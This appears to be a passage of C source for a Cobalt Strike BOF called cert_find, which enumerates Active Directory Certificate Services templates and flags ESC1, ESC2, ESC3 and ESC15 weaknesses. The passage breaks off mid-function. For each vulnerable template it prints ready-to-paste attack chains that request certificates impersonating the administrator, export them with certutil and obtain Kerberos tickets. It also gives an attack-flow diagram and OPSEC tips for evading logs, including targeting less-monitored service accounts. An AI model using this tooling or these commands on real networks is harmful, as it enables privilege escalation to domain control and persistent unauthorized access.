/*
 * cert_find - Find Vulnerable Certificate Templates
 *
 * Enumerates certificate templates and identifies those vulnerable to:
 * - ESC1: Enrollee supplies subject + client auth
 * - ESC2: Any Purpose EKU or no EKU
 * - ESC3: Certificate Request Agent
 * - ESC4: Vulnerable template ACLs
 * - ESC15: Application policies in schema v1
 *
 * Usage: cert_find [/vulnerable] [/enrollee] [/clientauth] [/domain:DOMAIN] [/dc:DC]
 */

#include "include/adcs_struct.h"
#include "include/adcs_utils.h"
#include "beacon.h"


typedef struct {
    char* buffer;
    int length;
    int position;
} ARG_PARSER;

static void arg_init(ARG_PARSER* parser, char* buffer, int length) {
    parser->buffer = buffer;
    parser->length = length;
    parser->position = 0;
}

static char* arg_get(ARG_PARSER* parser, const char* name) {
    char* buf = parser->buffer;
    int len = parser->length;
    char search[64];
    sprintf(search, "/%s:", name);
    int searchLen = strlen(search);

    for (int i = 0; i < len - searchLen; i++) {
        if (strncmp(buf + i, search, searchLen) == 0) {
            char* start = buf + i + searchLen;
            char* end = start;
            while (*end && *end != ' ' && *end != '\t' && *end != '\n') end++;
            int valueLen = end - start;
            char* value = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, valueLen + 1);
            if (value) {
                memcpy(value, start, valueLen);
                value[valueLen] = '\0';
            }
            return value;
        }
    }


    sprintf(search, "/%s", name);
    searchLen = strlen(search);
    for (int i = 0; i < len - searchLen; i++) {
        if (strncmp(buf + i, search, searchLen) == 0) {
            char next = buf[i + searchLen];
            if (next == '\0' || next == ' ' || next == '\t' || next == '\n') {
                char* value = (char*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, 2);
                if (value) value[0] = '1';
                return value;
            }
        }
    }

    return NULL;
}

/* Check if template has client authentication capability */
static BOOL check_client_auth(WCHAR** ekus, DWORD ekuCount) {
    if (ekuCount == 0) return TRUE;  /* No EKU means any purpose */

    for (DWORD i = 0; i < ekuCount; i++) {
        char* eku = wstr_to_str(ekus[i]);
        BOOL match = (strcmp(eku, "1.3.6.1.5.5.7.3.2") == 0 ||       /* Client Auth */
                     strcmp(eku, "1.3.6.1.4.1.311.20.2.2") == 0 ||   /* Smart Card Logon */
                     strcmp(eku, "1.3.6.1.4.1.311.10.12.1") == 0 ||  /* Any Purpose */
                     strcmp(eku, "2.5.29.37.0") == 0);               /* Any EKU */
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, eku);
        if (match) return TRUE;
    }
    return FALSE;
}

/* Check for ESC1: Enrollee supplies subject + client auth */
static BOOL check_esc1(DWORD certNameFlag, DWORD enrollFlag, WCHAR** ekus, DWORD ekuCount, DWORD raSignature) {
    /* ESC1 conditions:
     * - Enrollee can supply subject name
     * - Template allows client authentication
     * - No manager approval required
     * - No authorized signatures required
     */
    BOOL enrolleeSuppliesSubject = (certNameFlag & CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) != 0;
    BOOL hasClientAuth = check_client_auth(ekus, ekuCount);
    BOOL noManagerApproval = (enrollFlag & CT_FLAG_PEND_ALL_REQUESTS) == 0;
    BOOL noAuthorizedSig = (raSignature == 0);

    return enrolleeSuppliesSubject && hasClientAuth && noManagerApproval && noAuthorizedSig;
}

/* Check for ESC2: Any Purpose or no EKU */
static BOOL check_esc2(WCHAR** ekus, DWORD ekuCount, DWORD enrollFlag) {
    BOOL noManagerApproval = (enrollFlag & CT_FLAG_PEND_ALL_REQUESTS) == 0;
    if (!noManagerApproval) return FALSE;

    if (ekuCount == 0) return TRUE;  /* No EKU = any purpose */

    for (DWORD i = 0; i < ekuCount; i++) {
        char* eku = wstr_to_str(ekus[i]);
        BOOL match = (strcmp(eku, "1.3.6.1.4.1.311.10.12.1") == 0 ||  /* Any Purpose */
                     strcmp(eku, "2.5.29.37.0") == 0);                /* Any EKU */
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, eku);
        if (match) return TRUE;
    }
    return FALSE;
}

/* Check for ESC3: Certificate Request Agent */
static BOOL check_esc3(WCHAR** ekus, DWORD ekuCount, DWORD enrollFlag) {
    BOOL noManagerApproval = (enrollFlag & CT_FLAG_PEND_ALL_REQUESTS) == 0;
    if (!noManagerApproval) return FALSE;

    for (DWORD i = 0; i < ekuCount; i++) {
        char* eku = wstr_to_str(ekus[i]);
        BOOL match = (strcmp(eku, "1.3.6.1.4.1.311.20.2.1") == 0);  /* Certificate Request Agent */
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, eku);
        if (match) return TRUE;
    }
    return FALSE;
}

/* Check for ESC15: Application policies in schema v1 */
static BOOL check_esc15(DWORD schemaVersion, WCHAR** ekus, DWORD ekuCount) {
    /* Schema version 1 templates with certain application policies */
    return (schemaVersion == 1 && ekuCount > 0);
}

/* Discover CA name from Enrollment Services */
static char* discover_ca_name(LDAP* ld, const WCHAR* configDN) {
    WCHAR searchBase[512];
    swprintf(searchBase, 512, L"CN=Enrollment Services,CN=Public Key Services,CN=Services,%s", configDN);

    WCHAR* attrs[] = { L"cn", NULL };

    LDAPMessage* results = NULL;
    ULONG rc = WLDAP32$ldap_search_sW(ld, searchBase, LDAP_SCOPE_SUBTREE,
        L"(objectClass=pKIEnrollmentService)", attrs, 0, &results);

    if (rc != LDAP_SUCCESS) {
        return NULL;
    }

    char* caName = NULL;
    LDAPMessage* entry = WLDAP32$ldap_first_entry(ld, results);
    if (entry) {
        PWSTR* cnValues = WLDAP32$ldap_get_valuesW(ld, entry, L"cn");
        if (cnValues && cnValues[0]) {
            caName = wstr_to_str(cnValues[0]);
            WLDAP32$ldap_value_freeW(cnValues);
        }
    }

    WLDAP32$ldap_msgfree(results);
    return caName;
}

/* Parse enrollment flags to string */
static void parse_enrollment_flags(DWORD flags, formatp* output) {
    if (flags & CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS)
        BeaconFormatPrintf(output, "        INCLUDE_SYMMETRIC_ALGORITHMS\n");
    if (flags & CT_FLAG_PEND_ALL_REQUESTS)
        BeaconFormatPrintf(output, "        PEND_ALL_REQUESTS (Manager Approval)\n");
    if (flags & CT_FLAG_PUBLISH_TO_DS)
        BeaconFormatPrintf(output, "        PUBLISH_TO_DS\n");
    if (flags & CT_FLAG_AUTO_ENROLLMENT)
        BeaconFormatPrintf(output, "        AUTO_ENROLLMENT\n");
    if (flags & CT_FLAG_ALLOW_ENROLL_ON_BEHALF_OF)
        BeaconFormatPrintf(output, "        ALLOW_ENROLL_ON_BEHALF_OF\n");
}

/* Parse certificate name flags */
static void parse_name_flags(DWORD flags, formatp* output) {
    if (flags & CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
        BeaconFormatPrintf(output, "        ENROLLEE_SUPPLIES_SUBJECT\n");
    if (flags & CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME)
        BeaconFormatPrintf(output, "        ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME\n");
    if (flags & CT_FLAG_SUBJECT_ALT_REQUIRE_UPN)
        BeaconFormatPrintf(output, "        SUBJECT_ALT_REQUIRE_UPN\n");
    if (flags & CT_FLAG_SUBJECT_ALT_REQUIRE_EMAIL)
        BeaconFormatPrintf(output, "        SUBJECT_ALT_REQUIRE_EMAIL\n");
    if (flags & CT_FLAG_SUBJECT_ALT_REQUIRE_DNS)
        BeaconFormatPrintf(output, "        SUBJECT_ALT_REQUIRE_DNS\n");
    if (flags & CT_FLAG_SUBJECT_REQUIRE_EMAIL)
        BeaconFormatPrintf(output, "        SUBJECT_REQUIRE_EMAIL\n");
}

/* Enumerate certificate templates */
static void enumerate_templates(LDAP* ld, const WCHAR* configDN, formatp* output,
                                 BOOL vulnerableOnly, BOOL enrolleeOnly, BOOL clientAuthOnly,
                                 const char* domainName, const char* dcName, const char* caName) {
    WCHAR searchBase[512];
    swprintf(searchBase, 512, L"CN=Certificate Templates,CN=Public Key Services,CN=Services,%s", configDN);

    WCHAR* attrs[] = {
        L"cn",
        L"displayName",
        L"msPKI-Cert-Template-OID",
        L"msPKI-Certificate-Name-Flag",
        L"msPKI-Enrollment-Flag",
        L"msPKI-Private-Key-Flag",
        L"msPKI-RA-Signature",
        L"msPKI-Minimal-Key-Size",
        L"msPKI-Template-Schema-Version",
        L"pKIExtendedKeyUsage",
        L"nTSecurityDescriptor",
        NULL
    };

    LDAPMessage* results = NULL;
    ULONG rc = WLDAP32$ldap_search_sW(ld, searchBase, LDAP_SCOPE_SUBTREE,
        L"(objectClass=pKICertificateTemplate)", attrs, 0, &results);

    if (rc != LDAP_SUCCESS) {
        BeaconFormatPrintf(output, "[-] LDAP search failed for Certificate Templates: %d\n", rc);
        return;
    }

    int templateCount = 0;
    int vulnCount = 0;

    LDAPMessage* entry = WLDAP32$ldap_first_entry(ld, results);

    while (entry) {
        templateCount++;

        /* Get template attributes */
        DWORD certNameFlag = 0, enrollFlag = 0, privateKeyFlag = 0;
        DWORD raSignature = 0, minKeySize = 0, schemaVersion = 0;
        WCHAR* templateName = NULL;
        WCHAR* displayName = NULL;
        WCHAR** ekus = NULL;
        DWORD ekuCount = 0;

        /* Parse CN */
        PWSTR* cnValues = WLDAP32$ldap_get_valuesW(ld, entry, L"cn");
        if (cnValues && cnValues[0]) {
            templateName = cnValues[0];
        }

        /* Parse displayName */
        PWSTR* displayValues = WLDAP32$ldap_get_valuesW(ld, entry, L"displayName");
        if (displayValues && displayValues[0]) {
            displayName = displayValues[0];
        }

        /* Parse flags */
        PWSTR* flagValues;

        flagValues = WLDAP32$ldap_get_valuesW(ld, entry, L"msPKI-Certificate-Name-Flag");
        if (flagValues && flagValues[0]) {
            char* val = wstr_to_str(flagValues[0]);
            certNameFlag = strtoul(val, NULL, 10);
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, val);
            WLDAP32$ldap_value_freeW(flagValues);
        }

        flagValues = WLDAP32$ldap_get_valuesW(ld, entry, L"msPKI-Enrollment-Flag");
        if (flagValues && flagValues[0]) {
            char* val = wstr_to_str(flagValues[0]);
            enrollFlag = strtoul(val, NULL, 10);
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, val);
            WLDAP32$ldap_value_freeW(flagValues);
        }

        flagValues = WLDAP32$ldap_get_valuesW(ld, entry, L"msPKI-RA-Signature");
        if (flagValues && flagValues[0]) {
            char* val = wstr_to_str(flagValues[0]);
            raSignature = strtoul(val, NULL, 10);
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, val);
            WLDAP32$ldap_value_freeW(flagValues);
        }

        flagValues = WLDAP32$ldap_get_valuesW(ld, entry, L"msPKI-Template-Schema-Version");
        if (flagValues && flagValues[0]) {
            char* val = wstr_to_str(flagValues[0]);
            schemaVersion = strtoul(val, NULL, 10);
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, val);
            WLDAP32$ldap_value_freeW(flagValues);
        }

        flagValues = WLDAP32$ldap_get_valuesW(ld, entry, L"msPKI-Minimal-Key-Size");
        if (flagValues && flagValues[0]) {
            char* val = wstr_to_str(flagValues[0]);
            minKeySize = strtoul(val, NULL, 10);
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, val);
            WLDAP32$ldap_value_freeW(flagValues);
        }

        /* Parse EKUs */
        ekus = WLDAP32$ldap_get_valuesW(ld, entry, L"pKIExtendedKeyUsage");
        if (ekus) {
            for (int i = 0; ekus[i]; i++) ekuCount++;
        }

        /* Check vulnerabilities */
        BOOL isEsc1 = check_esc1(certNameFlag, enrollFlag, ekus, ekuCount, raSignature);
        BOOL isEsc2 = check_esc2(ekus, ekuCount, enrollFlag);
        BOOL isEsc3 = check_esc3(ekus, ekuCount, enrollFlag);
        BOOL isEsc15 = check_esc15(schemaVersion, ekus, ekuCount);

        BOOL hasClientAuth = check_client_auth(ekus, ekuCount);
        BOOL enrolleeSupplies = (certNameFlag & CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) != 0;

        BOOL isVulnerable = isEsc1 || isEsc2 || isEsc3;
        if (isVulnerable) vulnCount++;

        /* Apply filters */
        BOOL shouldShow = TRUE;
        if (vulnerableOnly && !isVulnerable) shouldShow = FALSE;
        if (enrolleeOnly && !enrolleeSupplies) shouldShow = FALSE;
        if (clientAuthOnly && !hasClientAuth) shouldShow = FALSE;

        if (shouldShow && templateName) {
            char* name = wstr_to_str(templateName);
            char* display = displayName ? wstr_to_str(displayName) : NULL;

            BeaconFormatPrintf(output, "\n========================================\n");
            BeaconFormatPrintf(output, "[*] Template: %s\n", name);
            if (display) {
                BeaconFormatPrintf(output, "    Display Name: %s\n", display);
                KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, display);
            }
            BeaconFormatPrintf(output, "========================================\n");

            /* Show vulnerabilities with testing steps */
            if (isVulnerable || isEsc15) {
                BeaconFormatPrintf(output, "    [!] VULNERABILITIES:\n");

                if (isEsc1) {
                    BeaconFormatPrintf(output, "        [!] ESC1 - Enrollee supplies subject + Client Auth\n");
                    BeaconFormatPrintf(output, "        [>] COPY/PASTE COMMANDS FOR ESC1:\n");
                    BeaconFormatPrintf(output, "        ------------------------------------------------------------\n");
                    BeaconFormatPrintf(output, "        # Step 1: Request cert impersonating administrator\n");
                    if (domainName && caName) {
                        BeaconFormatPrintf(output, "        cert_request /ca:%s\\\\%s /template:%s /altname:administrator@%s\n\n", dcName ? dcName : "DC", caName, name, domainName);
                    } else if (domainName) {
                        BeaconFormatPrintf(output, "        cert_request /ca:%s\\\\<CA-NAME> /template:%s /altname:administrator@%s\n\n", dcName ? dcName : "DC", name, domainName);
                    } else {
                        BeaconFormatPrintf(output, "        cert_request /ca:DC\\\\<CA-NAME> /template:%s /altname:administrator@domain.local\n\n", name);
                    }
                    BeaconFormatPrintf(output, "        # Step 2: Export cert to PFX (copy thumbprint from step 1 output)\n");
                    BeaconFormatPrintf(output, "        shell certutil -exportpfx -p \"P@ssw0rd\" My <THUMBPRINT> cert.pfx\n\n");
                    BeaconFormatPrintf(output, "        # Step 3: Request TGT as administrator using the certificate\n");
                    if (domainName && dcName) {
                        BeaconFormatPrintf(output, "        krb_asktgt /user:administrator /certificate:cert.pfx /password:P@ssw0rd /domain:%s /dc:%s /ptt\n\n", domainName, dcName);
                    } else {
                        BeaconFormatPrintf(output, "        krb_asktgt /user:administrator /certificate:cert.pfx /password:P@ssw0rd /ptt\n\n");
                    }
                    BeaconFormatPrintf(output, "        # Step 4: Verify TGT is in cache\n");
                    BeaconFormatPrintf(output, "        krb_klist\n");
                    BeaconFormatPrintf(output, "        ------------------------------------------------------------\n\n");
                }

                if (isEsc2) {
                    BeaconFormatPrintf(output, "        [!] ESC2 - Any Purpose EKU\n");
                    BeaconFormatPrintf(output, "        [>] COPY/PASTE COMMANDS FOR ESC2:\n");
                    BeaconFormatPrintf(output, "        ------------------------------------------------------------\n");
                    BeaconFormatPrintf(output, "        # Step 1: Request Any Purpose certificate\n");
                    if (domainName && caName) {
                        BeaconFormatPrintf(output, "        cert_request /ca:%s\\\\%s /template:%s\n\n", dcName ? dcName : "DC", caName, name);
                    } else if (domainName) {
                        BeaconFormatPrintf(output, "        cert_request /ca:%s\\\\<CA-NAME> /template:%s\n\n", dcName ? dcName : "DC", name);
                    } else {
                        BeaconFormatPrintf(output, "        cert_request /ca:DC\\\\<CA-NAME> /template:%s\n\n", name);
                    }
                    BeaconFormatPrintf(output, "        # Step 2: Export cert to PFX (copy thumbprint from step 1 output)\n");
                    BeaconFormatPrintf(output, "        shell certutil -exportpfx -p \"P@ssw0rd\" My <THUMBPRINT> cert.pfx\n\n");
                    BeaconFormatPrintf(output, "        # Step 3: Use cert for PKINIT auth (as yourself or forge for others)\n");
                    if (domainName && dcName) {
                        BeaconFormatPrintf(output, "        krb_asktgt /user:YOURUSERNAME /certificate:cert.pfx /password:P@ssw0rd /domain:%s /dc:%s /ptt\n\n", domainName, dcName);
                    } else {
                        BeaconFormatPrintf(output, "        krb_asktgt /user:YOURUSERNAME /certificate:cert.pfx /password:P@ssw0rd /ptt\n\n");
                    }
                    BeaconFormatPrintf(output, "        # Note: Any Purpose certs can also be used to sign other certs (SubCA attack)\n");
                    BeaconFormatPrintf(output, "        # Use cert_forge for advanced certificate forgery attacks\n");
                    BeaconFormatPrintf(output, "        ------------------------------------------------------------\n\n");
                }

                if (isEsc3) {
                    BeaconFormatPrintf(output, "        [!] ESC3 - Certificate Request Agent\n");
                    BeaconFormatPrintf(output, "        [>] COPY/PASTE COMMANDS FOR ESC3:\n");
                    BeaconFormatPrintf(output, "        ------------------------------------------------------------\n");
                    BeaconFormatPrintf(output, "        # Step 1: Request enrollment agent certificate using this template\n");
                    if (domainName && caName) {
                        BeaconFormatPrintf(output, "        cert_request /ca:%s\\\\%s /template:%s\n\n", dcName ? dcName : "DC", caName, name);
                    } else if (domainName) {
                        BeaconFormatPrintf(output, "        cert_request /ca:%s\\\\<CA-NAME> /template:%s\n\n", dcName ? dcName : "DC", name);
                    } else {
                        BeaconFormatPrintf(output, "        cert_request /ca:DC\\\\<CA-NAME> /template:%s\n\n", name);
                    }
                    BeaconFormatPrintf(output, "        # Step 2: Export agent cert to PFX (copy thumbprint from step 1 output)\n");
                    BeaconFormatPrintf(output, "        shell certutil -exportpfx -p \"P@ssw0rd\" My <THUMBPRINT> agent.pfx\n\n");
                    BeaconFormatPrintf(output, "        # Step 3: Use agent cert to request cert on behalf of administrator\n");
                    if (domainName && caName) {
                        BeaconFormatPrintf(output, "        cert_request_agent /ca:%s\\\\%s /template:User /onbehalfof:%s\\\\administrator /agent:agent.pfx\n\n", dcName ? dcName : "DC", caName, domainName);
                    } else if (domainName) {
                        BeaconFormatPrintf(output, "        cert_request_agent /ca:%s\\\\<CA-NAME> /template:User /onbehalfof:%s\\\\administrator /agent:agent.pfx\n\n", dcName ? dcName : "DC", domainName);
                    } else {
                        BeaconFormatPrintf(output, "        cert_request_agent /ca:DC\\\\<CA-NAME> /template:User /onbehalfof:DOMAIN\\\\administrator /agent:agent.pfx\n\n");
                    }
                    BeaconFormatPrintf(output, "        # Step 4: Export the admin cert and request TGT (copy thumbprint from step 3 output)\n");
                    BeaconFormatPrintf(output, "        shell certutil -exportpfx -p \"P@ssw0rd\" My <THUMBPRINT> admin.pfx\n");
                    if (domainName && dcName) {
                        BeaconFormatPrintf(output, "        krb_asktgt /user:administrator /certificate:admin.pfx /password:P@ssw0rd /domain:%s /dc:%s /ptt\n\n", domainName, dcName);
                    } else {
                        BeaconFormatPrintf(output, "        krb_asktgt /user:administrator /certificate:admin.pfx /password:P@ssw0rd /ptt\n\n");
                    }
                    BeaconFormatPrintf(output, "        # Step 5: Verify TGT\n");
                    BeaconFormatPrintf(output, "        krb_klist\n");
                    BeaconFormatPrintf(output, "        ------------------------------------------------------------\n\n");
                }

                if (isEsc15) {
                    BeaconFormatPrintf(output, "        [?] ESC15 - Application policies in schema v1\n");
                    BeaconFormatPrintf(output, "        [>] COPY/PASTE COMMANDS FOR ESC15:\n");
                    BeaconFormatPrintf(output, "        ------------------------------------------------------------\n");
                    BeaconFormatPrintf(output, "        # Note: Schema v1 templates may ignore msPKI-Certificate-Application-Policy\n");
                    BeaconFormatPrintf(output, "        # This means EKUs defined in pKIExtendedKeyUsage are used instead\n\n");
                    BeaconFormatPrintf(output, "        # Step 1: Request cert and check if Application Policy is ignored\n");
                    if (domainName && caName) {
                        BeaconFormatPrintf(output, "        cert_request /ca:%s\\\\%s /template:%s\n\n", dcName ? dcName : "DC", caName, name);
                    } else if (domainName) {
                        BeaconFormatPrintf(output, "        cert_request /ca:%s\\\\<CA-NAME> /template:%s\n\n", dcName ? dcName : "DC", name);
                    } else {
                        BeaconFormatPrintf(output, "        cert_request /ca:DC\\\\<CA-NAME> /template:%s\n\n", name);
                    }
                    BeaconFormatPrintf(output, "        # Step 2: Export and inspect the certificate EKUs (copy thumbprint from step 1 output)\n");
                    BeaconFormatPrintf(output, "        shell certutil -exportpfx -p \"P@ssw0rd\" My <THUMBPRINT> test.pfx\n");
                    BeaconFormatPrintf(output, "        shell certutil -dump test.pfx\n\n");
                    BeaconFormatPrintf(output, "        # Step 3: If cert has Client Auth EKU, use for authentication\n");
                    if (domainName && dcName) {
                        BeaconFormatPrintf(output, "        krb_asktgt /user:YOURUSERNAME /certificate:test.pfx /password:P@ssw0rd /domain:%s /dc:%s /ptt\n", domainName, dcName);
                    } else {
                        BeaconFormatPrintf(output, "        krb_asktgt /user:YOURUSERNAME /certificate:test.pfx /password:P@ssw0rd /ptt\n");
                    }
                    BeaconFormatPrintf(output, "        ------------------------------------------------------------\n\n");
                }
            }

            BeaconFormatPrintf(output, "    Schema Version   : %d\n", schemaVersion);
            BeaconFormatPrintf(output, "    Min Key Size     : %d\n", minKeySize);
            BeaconFormatPrintf(output, "    RA Signatures    : %d\n", raSignature);

            /* Enrollment flags */
            BeaconFormatPrintf(output, "    Enrollment Flags : 0x%08X\n", enrollFlag);
            parse_enrollment_flags(enrollFlag, output);

            /* Certificate name flags */
            BeaconFormatPrintf(output, "    Name Flags       : 0x%08X\n", certNameFlag);
            parse_name_flags(certNameFlag, output);

            /* EKUs */
            BeaconFormatPrintf(output, "    Extended Key Usage:\n");
            if (ekuCount == 0) {
                BeaconFormatPrintf(output, "        (none - Any Purpose)\n");
            } else {
                for (DWORD i = 0; i < ekuCount; i++) {
                    char* eku = wstr_to_str(ekus[i]);
                    BeaconFormatPrintf(output, "        %s", eku);

                    /* Add friendly name */
                    if (strcmp(eku, "1.3.6.1.5.5.7.3.2") == 0)
                        BeaconFormatPrintf(output, " (Client Authentication)");
                    else if (strcmp(eku, "1.3.6.1.5.5.7.3.1") == 0)
                        BeaconFormatPrintf(output, " (Server Authentication)");
                    else if (strcmp(eku, "1.3.6.1.4.1.311.20.2.2") == 0)
                        BeaconFormatPrintf(output, " (Smart Card Logon)");
                    else if (strcmp(eku, "1.3.6.1.4.1.311.20.2.1") == 0)
                        BeaconFormatPrintf(output, " (Certificate Request Agent)");
                    else if (strcmp(eku, "1.3.6.1.4.1.311.10.12.1") == 0)
                        BeaconFormatPrintf(output, " (Any Purpose)");
                    else if (strcmp(eku, "1.3.6.1.5.5.7.3.4") == 0)
                        BeaconFormatPrintf(output, " (Email Protection)");
                    else if (strcmp(eku, "1.3.6.1.5.5.7.3.3") == 0)
                        BeaconFormatPrintf(output, " (Code Signing)");

                    BeaconFormatPrintf(output, "\n");
                    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, eku);
                }
            }

            /* Key capabilities */
            BeaconFormatPrintf(output, "    Capabilities     :\n");
            if (hasClientAuth) BeaconFormatPrintf(output, "        [+] Client Authentication\n");
            if (enrolleeSupplies) BeaconFormatPrintf(output, "        [+] Enrollee Supplies Subject\n");
            if ((enrollFlag & CT_FLAG_PEND_ALL_REQUESTS) == 0)
                BeaconFormatPrintf(output, "        [+] No Manager Approval Required\n");
            if (raSignature == 0)
                BeaconFormatPrintf(output, "        [+] No Authorized Signatures Required\n");

            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, name);
        }

        /* Cleanup */
        if (cnValues) WLDAP32$ldap_value_freeW(cnValues);
        if (displayValues) WLDAP32$ldap_value_freeW(displayValues);
        if (ekus) WLDAP32$ldap_value_freeW(ekus);

        entry = WLDAP32$ldap_next_entry(ld, entry);
    }

    WLDAP32$ldap_msgfree(results);

    BeaconFormatPrintf(output, "\n========================================\n");
    BeaconFormatPrintf(output, "[*] Summary: %d templates found, %d potentially vulnerable\n",
        templateCount, vulnCount);
    BeaconFormatPrintf(output, "========================================\n");

    if (vulnCount > 0) {
        BeaconFormatPrintf(output, "\n[!] QUICK REFERENCE - BOF COMMANDS:\n");
        BeaconFormatPrintf(output, "========================================\n");
        BeaconFormatPrintf(output, "\n[*] AVAILABLE BOFs:\n");
        BeaconFormatPrintf(output, "    cert_cas          - Enumerate Certificate Authorities\n");
        BeaconFormatPrintf(output, "    cert_find         - Find vulnerable certificate templates\n");
        BeaconFormatPrintf(output, "    cert_request      - Request certificates (ESC1/ESC2)\n");
        BeaconFormatPrintf(output, "    cert_request_agent- Request certs on behalf of users (ESC3)\n");
        BeaconFormatPrintf(output, "    cert_download     - Download issued certificates\n");
        BeaconFormatPrintf(output, "    cert_forge        - Forge certificates (Golden Cert)\n");
        BeaconFormatPrintf(output, "    krb_asktgt        - Request TGT with cert/password/hash\n");
        BeaconFormatPrintf(output, "    krb_ptt           - Pass the ticket\n");
        BeaconFormatPrintf(output, "    krb_klist         - List cached Kerberos tickets\n");
        BeaconFormatPrintf(output, "\n[*] TYPICAL ATTACK FLOW:\n");
        BeaconFormatPrintf(output, "    +-----------------+     +---------------+     +-----------+\n");
        BeaconFormatPrintf(output, "    | 1. cert_cas     | --> | 2. cert_find  | --> | 3. Exploit|\n");
        BeaconFormatPrintf(output, "    | (Find CA name)  |     | (Find vulns)  |     | (ESC1-15) |\n");
        BeaconFormatPrintf(output, "    +-----------------+     +---------------+     +-----------+\n");
        BeaconFormatPrintf(output, "                                                        |\n");
        BeaconFormatPrintf(output, "    +-----------------+     +---------------+           v\n");
        BeaconFormatPrintf(output, "    | 6. krb_klist    | <-- | 5. krb_asktgt | <-- +-----------+\n");
        BeaconFormatPrintf(output, "    | (Verify ticket) |     | (Get TGT)     |     | 4. Export |\n");
        BeaconFormatPrintf(output, "    +-----------------+     +---------------+     | (certutil)|\n");
        BeaconFormatPrintf(output, "                                                  +-----------+\n");
        BeaconFormatPrintf(output, "\n[*] COPY/PASTE EXAMPLES:\n");
        BeaconFormatPrintf(output, "------------------------------------------------------------------------\n");
        if (domainName && dcName) {
            BeaconFormatPrintf(output, "# Enumerate CAs in %s:\n", domainName);
            BeaconFormatPrintf(output, "cert_cas /domain:%s /dc:%s\n\n", domainName, dcName);
            BeaconFormatPrintf(output, "# Find vulnerable templates:\n");
            BeaconFormatPrintf(output, "cert_find /vulnerable /domain:%s /dc:%s\n\n", domainName, dcName);
            BeaconFormatPrintf(output, "# ESC1 - Request cert as administrator:\n");
            BeaconFormatPrintf(output, "cert_request /ca:%s\\\\CA-NAME /template:YOURTEMPLATE /altname:administrator@%s\n\n", dcName, domainName);
            BeaconFormatPrintf(output, "# Export cert to PFX:\n");
            BeaconFormatPrintf(output, "shell certutil -exportpfx -p \"P@ssw0rd\" My THUMBPRINT cert.pfx\n\n");
            BeaconFormatPrintf(output, "# Get TGT as administrator:\n");
            BeaconFormatPrintf(output, "krb_asktgt /user:administrator /certificate:cert.pfx /password:P@ssw0rd /domain:%s /dc:%s /ptt\n\n", domainName, dcName);
            BeaconFormatPrintf(output, "# Verify ticket:\n");
            BeaconFormatPrintf(output, "krb_klist\n");
        } else {
            BeaconFormatPrintf(output, "# Enumerate CAs:\n");
            BeaconFormatPrintf(output, "cert_cas /domain:YOURDOMAIN /dc:DC_HOSTNAME\n\n");
            BeaconFormatPrintf(output, "# Find vulnerable templates:\n");
            BeaconFormatPrintf(output, "cert_find /vulnerable /domain:YOURDOMAIN /dc:DC_HOSTNAME\n\n");
            BeaconFormatPrintf(output, "# ESC1 - Request cert as administrator:\n");
            BeaconFormatPrintf(output, "cert_request /ca:DC\\\\CA-NAME /template:TEMPLATE /altname:administrator@DOMAIN\n\n");
            BeaconFormatPrintf(output, "# Export cert to PFX:\n");
            BeaconFormatPrintf(output, "shell certutil -exportpfx -p \"P@ssw0rd\" My THUMBPRINT cert.pfx\n\n");
            BeaconFormatPrintf(output, "# Get TGT as administrator:\n");
            BeaconFormatPrintf(output, "krb_asktgt /user:administrator /certificate:cert.pfx /password:P@ssw0rd /ptt\n\n");
            BeaconFormatPrintf(output, "# Verify ticket:\n");
            BeaconFormatPrintf(output, "krb_klist\n");
        }
        BeaconFormatPrintf(output, "------------------------------------------------------------------------\n");
        BeaconFormatPrintf(output, "\n[*] VULNERABILITY QUICK REFERENCE:\n");
        BeaconFormatPrintf(output, "    ESC1:  Enrollee supplies SAN  -> Impersonate any user\n");
        BeaconFormatPrintf(output, "    ESC2:  Any Purpose EKU        -> Auth as self, forge certs\n");
        BeaconFormatPrintf(output, "    ESC3:  Enrollment Agent       -> Request certs for others\n");
        BeaconFormatPrintf(output, "    ESC15: Schema v1 policy bug   -> May bypass EKU restrictions\n");
        BeaconFormatPrintf(output, "\n[*] OPSEC NOTES:\n");
        BeaconFormatPrintf(output, "    - Certificate requests logged in Event ID 4886/4887\n");
        BeaconFormatPrintf(output, "    - Kerberos auth with certs logged in Event ID 4768\n");
        BeaconFormatPrintf(output, "    - Certificates persist - can be used for long-term access\n");
        BeaconFormatPrintf(output, "    - Consider requesting certs for service accounts (less monitored)\n");
    }
}


void go(char* args, int alen) {
    formatp output;
    ARG_PARSER parser;
    char* domain = NULL;
    char* dc = NULL;
    char* vulnerableOnly = NULL;
    char* enrolleeOnly = NULL;
    char* clientAuthOnly = NULL;

    BeaconFormatAlloc(&output, 131072);  /* 128KB for large template lists */
    arg_init(&parser, args, alen);

    BeaconFormatPrintf(&output, "\n[*] Action: Find Certificate Templates\n\n");


    domain = arg_get(&parser, "domain");
    dc = arg_get(&parser, "dc");
    vulnerableOnly = arg_get(&parser, "vulnerable");
    enrolleeOnly = arg_get(&parser, "enrollee");
    clientAuthOnly = arg_get(&parser, "clientauth");

    if (vulnerableOnly) {
        BeaconFormatPrintf(&output, "[*] Filter: Vulnerable templates only\n");
    }
    if (enrolleeOnly) {
        BeaconFormatPrintf(&output, "[*] Filter: Enrollee supplies subject only\n");
    }
    if (clientAuthOnly) {
        BeaconFormatPrintf(&output, "[*] Filter: Client authentication templates only\n");
    }


    WCHAR* server = NULL;
    if (dc) {
        server = str_to_wstr(dc);
    } else {
        WCHAR dcBuf[256];
